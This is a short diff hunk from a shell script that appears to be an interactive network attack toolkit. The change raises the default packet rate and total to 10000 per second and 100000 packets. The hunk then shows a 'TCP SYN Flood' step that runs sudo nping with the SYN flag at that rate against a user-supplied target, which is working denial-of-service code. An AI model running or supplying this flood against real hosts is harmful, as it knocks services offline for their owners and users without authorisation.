@@ -170,10 +170,10 @@ bannergrab()
 		: ${SOURCE:=i}
 		echo "Enter number of packets to send per second (default is 10000):"
 	read RATE
-		: ${RATE:=1000}
+		: ${RATE:=10000}
 		echo "Enter total number of packets to send (default is 100000):"
 	read TOTAL
-		: ${TOTAL:=10000}
+		: ${TOTAL:=100000}
 		echo "Starting TCP SYN Flood..."
 	if 	[ "$SOURCE" = "i" ]; then
 		sudo nping --tcp -p $PORT --flags syn --rate $RATE -c $TOTAL -v-1 $TARGET
